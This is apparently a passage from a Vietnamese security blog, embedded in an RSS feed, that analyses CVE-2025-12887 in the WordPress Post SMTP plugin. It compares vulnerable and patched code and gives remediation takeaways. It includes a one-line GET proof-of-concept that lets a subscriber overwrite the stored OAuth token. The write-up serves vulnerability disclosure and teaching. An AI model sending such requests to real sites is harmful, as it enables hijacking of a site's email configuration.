      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-12-08-cve-2025-12887/app.jpg&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Plugin &lt;strong&gt;Post SMTP&lt;/strong&gt; cho &lt;strong&gt;WordPress&lt;/strong&gt; d·ªÖ b·ªã t·∫•n c√¥ng &lt;strong&gt;v∆∞·ª£t quy·ªÅn x√°c th·ª±c&lt;/strong&gt; trong t·∫•t c·∫£ c√°c &lt;strong&gt;phi√™n b·∫£n&lt;/strong&gt; cho ƒë·∫øn v√† bao g·ªìm &lt;strong&gt;3.6.1&lt;/strong&gt;. Nguy√™n nh√¢n l√† do plugin kh√¥ng x√°c minh ƒë√∫ng c√°ch r·∫±ng &lt;strong&gt;ng∆∞·ªùi d√πng&lt;/strong&gt; c√≥ ƒë∆∞·ª£c ph√©p c·∫≠p nh·∫≠t &lt;strong&gt;token OAuth&lt;/strong&gt; trong h√†m &lt;strong&gt;&amp;lsquo;handle_gmail_oauth_redirect&amp;rsquo;&lt;/strong&gt;. ƒêi·ªÅu n√†y cho ph√©p &lt;strong&gt;k·∫ª t·∫•n c√¥ng&lt;/strong&gt; ƒë√£ &lt;strong&gt;x√°c th·ª±c&lt;/strong&gt;, v·ªõi quy·ªÅn truy c·∫≠p t·ª´ c·∫•p ƒë·ªô &lt;strong&gt;ng∆∞·ªùi ƒëƒÉng k√Ω&lt;/strong&gt; tr·ªü l√™n, ch√®n c√°c &lt;strong&gt;th√¥ng tin x√°c th·ª±c OAuth&lt;/strong&gt; kh√¥ng h·ª£p l·ªá ho·∫∑c do &lt;strong&gt;k·∫ª t·∫•n c√¥ng ki·ªÉm so√°t&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-12887&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-12887&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Broken Access Control&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 3.6.1&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 3.6.2&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: Low (5.4)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Contributor&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/post-smtp/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Post SMTP Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Virtual Machine&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Docker&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Plugin Version&lt;/strong&gt; - &lt;strong&gt;Post SMTP&lt;/strong&gt;:&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;3.6.1&lt;/code&gt; ‚Äì &lt;strong&gt;vulnerable&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;3.6.2&lt;/code&gt; ‚Äì &lt;strong&gt;patched&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff Tool (diff)&lt;/strong&gt; ‚Üí &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; ho·∫∑c b·∫•t k·ª≥ c√¥ng c·ª• diff n√†o.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Plugin ƒë√£ ƒëƒÉng k√Ω m·ªôt action hook:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;add_action( &amp;#39;`admin_init`&amp;#39;, array( $this, &amp;#39;handle_gmail_oauth_redirect&amp;#39; ) );&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Hook &lt;code&gt;admin_init&lt;/code&gt;&lt;/strong&gt;&lt;br&gt;&#xA;ƒê√¢y l√† m·ªôt hook trong WordPress ƒë∆∞·ª£c k√≠ch ho·∫°t &lt;strong&gt;m·ªói khi m·ªôt ng∆∞·ªùi d√πng ƒë√£ ƒëƒÉng nh·∫≠p truy c·∫≠p v√†o khu v·ª±c qu·∫£n tr·ªã (admin area)&lt;/strong&gt;. N√≥ ch·∫°y s·ªõm trong qu√° tr√¨nh kh·ªüi t·∫°o trang qu·∫£n tr·ªã, tr∆∞·ªõc khi b·∫•t k·ª≥ n·ªôi dung n√†o ƒë∆∞·ª£c hi·ªÉn th·ªã.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;ƒêƒÉng k√Ω action&lt;/strong&gt;&lt;br&gt;&#xA;Plugin Post SMTP ƒë√£ ƒëƒÉng k√Ω h√†m &lt;code&gt;handle_gmail_oauth_redirect&lt;/code&gt; v·ªõi hook &lt;code&gt;admin_init&lt;/code&gt;:&#xA;ƒêi·ªÅu n√†y c√≥ nghƒ©a l√† &lt;strong&gt;b·∫•t k·ª≥ ng∆∞·ªùi d√πng n√†o ƒë√£ ƒëƒÉng nh·∫≠p&lt;/strong&gt; (k·ªÉ c·∫£ v·ªõi quy·ªÅn th·∫•p nh∆∞ &lt;em&gt;subscriber&lt;/em&gt;) ƒë·ªÅu c√≥ th·ªÉ k√≠ch ho·∫°t h√†m n√†y khi truy c·∫≠p v√†o trang qu·∫£n tr·ªã.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;&lt;strong&gt;Trong phi√™n b·∫£n l·ªói (v3.6.1):&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function handle_gmail_oauth_redirect() {&#xA;    // Check if the required OAuth parameters are present in the URL.&#xA;    if ( isset( $_GET[&amp;#39;action&amp;#39;] ) &amp;amp;&amp;amp; $_GET[&amp;#39;action&amp;#39;] === &amp;#39;gmail_oauth_redirect&amp;#39; ) {&#xA;        // Sanitize and retrieve URL parameters&#xA;        $access_token  = isset( $_GET[&amp;#39;access_token&amp;#39;] ) ? sanitize_text_field( $_GET[&amp;#39;access_token&amp;#39;] ) : null;&#xA;        $refresh_token = isset( $_GET[&amp;#39;refresh_token&amp;#39;] ) ? sanitize_text_field( $_GET[&amp;#39;refresh_token&amp;#39;] ) : null;&#xA;        $expires_in    = isset( $_GET[&amp;#39;expires_in&amp;#39;] ) ? intval( $_GET[&amp;#39;expires_in&amp;#39;] ) : 0;&#xA;        $msg           = isset( $_GET[&amp;#39;msg&amp;#39;] ) ? sanitize_text_field( $_GET[&amp;#39;msg&amp;#39;] ) : &amp;#39;&amp;#39;;&#xA;        $user_email    = isset( $_GET[&amp;#39;user_email&amp;#39;] ) ? sanitize_email( $_GET[&amp;#39;user_email&amp;#39;] ) : &amp;#39;&amp;#39;;&#xA;        $auth_token_expires = time() &amp;#43; $expires_in;&#xA;&#xA;        if ( $access_token ) {&#xA;            $oauth_data = array(&#xA;                &amp;#39;access_token&amp;#39;      =&amp;gt; $access_token,&#xA;                &amp;#39;refresh_token&amp;#39;     =&amp;gt; $refresh_token,&#xA;                &amp;#39;auth_token_expires&amp;#39;=&amp;gt; $auth_token_expires,&#xA;                &amp;#39;vendor_name&amp;#39;       =&amp;gt; &amp;#39;google&amp;#39;,&#xA;                &amp;#39;user_email&amp;#39;        =&amp;gt; $user_email,&#xA;            );&#xA;            // Save the OAuth parameters to the WordPress options table.&#xA;            update_option( &amp;#39;postman_auth_token&amp;#39;, $oauth_data );&#xA;        }&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Logic c·ªßa h√†m &lt;code&gt;handle_gmail_oauth_redirect&lt;/code&gt; cho th·∫•y c√°ch plugin Post SMTP x·ª≠ l√Ω vi·ªác nh·∫≠n &lt;strong&gt;OAuth token&lt;/strong&gt; t·ª´ Gmail. Tuy nhi√™n, c√≥ m·ªôt s·ªë ƒëi·ªÉm y·∫øu nghi√™m tr·ªçng:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Ch·ªâ c·∫ßn ng∆∞·ªùi d√πng ƒë√£ ƒëƒÉng nh·∫≠p v√† truy c·∫≠p v√†o trang qu·∫£n tr·ªã v·ªõi tham s·ªë &lt;code&gt;action=gmail_oauth_redirect&lt;/code&gt; v√† &lt;code&gt;access_token&lt;/code&gt; trong URL, logic update s·∫Ω ƒë∆∞·ª£c g·ªçi.&lt;/li&gt;&#xA;&lt;li&gt;Kh√¥ng c√≥ b·∫•t k·ª≥ &lt;strong&gt;ki·ªÉm tra quy·ªÅn h·∫°n (capability check)&lt;/strong&gt; n√†o ƒë·ªÉ ƒë·∫£m b·∫£o ch·ªâ qu·∫£n tr·ªã vi√™n m·ªõi ƒë∆∞·ª£c ph√©p th·ª±c hi·ªán.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;&lt;strong&gt;B·∫£n v√° (v3.6.2):&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function handle_gmail_oauth_redirect() {&#xA;    // Check if the required OAuth parameters are present in the URL.&#xA;    if ( isset( $_GET[&amp;#39;action&amp;#39;] ) &amp;amp;&amp;amp; $_GET[&amp;#39;action&amp;#39;] === &amp;#39;gmail_oauth_redirect&amp;#39; ) {&#xA;        &#xA;    // Capability check: Only allow administrators to update OAuth tokens&#xA;    if ( ! current_user_can( &amp;#39;manage_options&amp;#39; ) ) {&#xA;        wp_die( esc_html__( &amp;#39;You do not have sufficient permissions to access this page.&amp;#39;, &amp;#39;post-smtp&amp;#39; ) );&#xA;    }&#xA;    &#xA;    // CSRF protection: Verify nonce (required by security report)&#xA;    if ( ! isset( $_GET[&amp;#39;_wpnonce&amp;#39;] ) || empty( $_GET[&amp;#39;_wpnonce&amp;#39;] ) ) {&#xA;        wp_die( esc_html__( &amp;#39;Security check failed. Nonce is missing.&amp;#39;, &amp;#39;post-smtp&amp;#39; ) );&#xA;    }&#xA;    &#xA;    // Verify the nonce&#xA;    $nonce = sanitize_text_field( $_GET[&amp;#39;_wpnonce&amp;#39;] );&#xA;    if ( ! wp_verify_nonce( $nonce, &amp;#39;gmail_oauth_redirect&amp;#39; ) ) {&#xA;        wp_die( esc_html__( &amp;#39;Security check failed. Invalid nonce. Please try again.&amp;#39;, &amp;#39;post-smtp&amp;#39; ) );&#xA;    }&#xA;        &#xA;        // Sanitize and retrieve URL parameters&#xA;        $access_token  = isset( $_GET[&amp;#39;access_token&amp;#39;] ) ? sanitize_text_field( $_GET[&amp;#39;access_token&amp;#39;] ) : null;&#xA;        $refresh_token = isset( $_GET[&amp;#39;refresh_token&amp;#39;] ) ? sanitize_text_field( $_GET[&amp;#39;refresh_token&amp;#39;] ) : null;&#xA;        $expires_in    = isset( $_GET[&amp;#39;expires_in&amp;#39;] ) ? intval( $_GET[&amp;#39;expires_in&amp;#39;] ) : 0;&#xA;        $msg           = isset( $_GET[&amp;#39;msg&amp;#39;] ) ? sanitize_text_field( $_GET[&amp;#39;msg&amp;#39;] ) : &amp;#39;&amp;#39;;&#xA;        $user_email    = isset( $_GET[&amp;#39;user_email&amp;#39;] ) ? sanitize_email( $_GET[&amp;#39;user_email&amp;#39;] ) : &amp;#39;&amp;#39;;&#xA;        $auth_token_expires = time() &amp;#43; $expires_in;&#xA;&#xA;        if ( $access_token ) {&#xA;            $oauth_data = array(&#xA;                &amp;#39;access_token&amp;#39;      =&amp;gt; $access_token,&#xA;                &amp;#39;refresh_token&amp;#39;     =&amp;gt; $refresh_token,&#xA;                &amp;#39;auth_token_expires&amp;#39;=&amp;gt; $auth_token_expires,&#xA;                &amp;#39;vendor_name&amp;#39;       =&amp;gt; &amp;#39;google&amp;#39;,&#xA;                &amp;#39;user_email&amp;#39;        =&amp;gt; $user_email,&#xA;            );&#xA;            // Save the OAuth parameters to the WordPress options table.&#xA;            update_option( &amp;#39;postman_auth_token&amp;#39;, $oauth_data );&#xA;        }&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;B·∫£n v√° ƒë√£:&lt;/p&gt;&#xA;&lt;ol&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;Ki·ªÉm tra quy·ªÅn h·∫°n (Capability check):&#xA;Ch·ªâ administrator (ng∆∞·ªùi c√≥ quy·ªÅn &lt;code&gt;manage_options&lt;/code&gt;) m·ªõi ƒë∆∞·ª£c ph√©p c·∫≠p nh·∫≠t &lt;strong&gt;OAuth token&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;B·∫£o v·ªá CSRF b·∫±ng nonce:&#xA;Th√™m &lt;strong&gt;nonce verification&lt;/strong&gt; ƒë·ªÉ ƒë·∫£m b·∫£o request th·ª±c s·ª± ƒë∆∞·ª£c t·∫°o t·ª´ trang h·ª£p l·ªá trong WordPress, ngƒÉn ch·∫∑n t·∫•n c√¥ng &lt;strong&gt;CSRF (Cross-Site Request Forgery)&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;graph TD&#xA;A[&amp;#34;Authenticated user (Subscriber or higher)&amp;#34;] &#xA;--&amp;gt; B[&amp;#34;Access admin area: /wp-admin/&amp;#34;]&#xA;--&amp;gt; C[&amp;#34;admin_init hook is triggered&amp;#34;]&#xA;--&amp;gt; D[&amp;#34;Post SMTP: handle_gmail_oauth_redirect() is executed&amp;#34;]&#xA;--&amp;gt; E{&amp;#34;Is GET[action] = gmail_oauth_redirect ?&amp;#34;}&#xA;E -- No --&amp;gt; F[&amp;#34;Function exits ‚Äì No impact&amp;#34;]&#xA;E -- Yes --&amp;gt; G[&amp;#34;Read parameters from URL: access_token, refresh_token, expires_in, user_email&amp;#34;]&#xA;--&amp;gt; H{&amp;#34;Is access_token present ?&amp;#34;}&#xA;H -- No --&amp;gt; F&#xA;H -- Yes --&amp;gt; I[&amp;#34;Build OAuth data array&amp;#34;]&#xA;--&amp;gt; J[&amp;#34;update_option(&amp;#39;postman_auth_token&amp;#39;, oauth_data)&amp;#34;]&#xA;--&amp;gt; K[&amp;#34;OAuth token is overwritten by attacker-controlled data&amp;#34;]&lt;/code&gt;&lt;/pre&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;G·ª≠i request b·∫±ng t√†i kho·∫£n &lt;strong&gt;Subcriber+&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;GET /wp-admin/?action=gmail_oauth_redirect&amp;amp;access_token=access_token_payload&amp;amp;refresh_token=refresh_to_payload&amp;amp;expires_in=expires_in_payload&amp;amp;user_email=user_email@gmail.com HTTP/1.1&#xA;Host: localhost&#xA;Cookie: subcriber&amp;#43; cookie&lt;/code&gt;&lt;/pre&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;L·ªó h·ªïng CVE-2025-12887 xu·∫•t ph√°t t·ª´ vi·ªác plugin Post SMTP li√™n k·∫øt tr·ª±c ti·∫øp h√†m &lt;code&gt;handle_gmail_oauth_redirect&lt;/code&gt; v√†o hook &lt;code&gt;admin_init&lt;/code&gt; m√† kh√¥ng th·ª±c hi·ªán b·∫•t k·ª≥ ki·ªÉm tra quy·ªÅn h·∫°n ho·∫∑c c∆° ch·∫ø x√°c th·ª±c b·ªï sung n√†o. ƒêi·ªÅu n√†y cho ph√©p b·∫•t k·ª≥ ng∆∞·ªùi d√πng ƒë√£ ƒëƒÉng nh·∫≠p, k·ªÉ c·∫£ v·ªõi quy·ªÅn th·∫•p nh∆∞ &lt;strong&gt;Subscriber/Contributor&lt;/strong&gt;, c√≥ th·ªÉ g·ª≠i request t√πy √Ω ƒë·ªÉ ghi ƒë√® gi√° tr·ªã &lt;code&gt;postman_auth_token&lt;/code&gt; trong b·∫£ng &lt;code&gt;options&lt;/code&gt; c·ªßa WordPress.&lt;/p&gt;&#xA;&lt;p&gt;Vi·ªác thi·∫øu &lt;strong&gt;capability check&lt;/strong&gt; v√† &lt;strong&gt;nonce verification&lt;/strong&gt; ƒë√£ t·∫°o ra m·ªôt ƒëi·ªÉm y·∫øu nghi√™m tr·ªçng trong quy tr√¨nh x·ª≠ l√Ω OAuth, d·∫´n ƒë·∫øn nguy c∆° chi·∫øm quy·ªÅn ki·ªÉm so√°t c·∫•u h√¨nh g·ª≠i email c·ªßa website. B·∫£n v√° ·ªü phi√™n b·∫£n 3.6.2 ƒë√£ kh·∫Øc ph·ª•c v·∫•n ƒë·ªÅ b·∫±ng c√°ch gi·ªõi h·∫°n quy·ªÅn th·ª±c thi cho administrator v√† b·ªï sung ki·ªÉm tra nonce ƒë·ªÉ ngƒÉn ch·∫∑n c√°c request gi·∫£ m·∫°o.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key Takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;Kh√¥ng bao gi·ªù g·∫Øn c√°c h√†nh ƒë·ªông nh·∫°y c·∫£m (nh∆∞ c·∫≠p nh·∫≠t token) v√†o hook chung nh∆∞ &lt;code&gt;admin_init&lt;/code&gt; m√† kh√¥ng ki·ªÉm tra quy·ªÅn h·∫°n ng∆∞·ªùi d√πng.&lt;/li&gt;&#xA;&lt;li&gt;Lu√¥n s·ª≠ d·ª•ng &lt;code&gt;current_user_can()&lt;/code&gt; ƒë·ªÉ ƒë·∫£m b·∫£o ch·ªâ c√°c vai tr√≤ ph√π h·ª£p m·ªõi c√≥ th·ªÉ th·ª±c hi·ªán h√†nh vi nguy hi·ªÉm.&lt;/li&gt;&#xA;&lt;li&gt;B·∫Øt bu·ªôc tri·ªÉn khai &lt;strong&gt;nonce verification&lt;/strong&gt; cho c√°c request thay ƒë·ªïi tr·∫°ng th√°i nh·∫±m ph√≤ng ch·ªëng CSRF.&lt;/li&gt;&#xA;&lt;li&gt;Kh√¥ng n√™n tin t∆∞·ªüng d·ªØ li·ªáu ƒë·∫øn t·ª´ &lt;code&gt;$_GET&lt;/code&gt; ho·∫∑c &lt;code&gt;$_POST&lt;/code&gt; m√† thi·∫øu c∆° ch·∫ø x√°c th·ª±c v√† ph√¢n quy·ªÅn r√µ r√†ng.&lt;/li&gt;&#xA;&lt;li&gt;Vi·ªác c·∫≠p nh·∫≠t token OAuth c·∫ßn ƒë∆∞·ª£c coi l√† h√†nh ƒë·ªông c·∫•p qu·∫£n tr·ªã v√† ph·∫£i ƒë∆∞·ª£c b·∫£o v·ªá t∆∞∆°ng ƒë∆∞∆°ng c√°c thay ƒë·ªïi quan tr·ªçng kh√°c trong h·ªá th·ªëng.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; 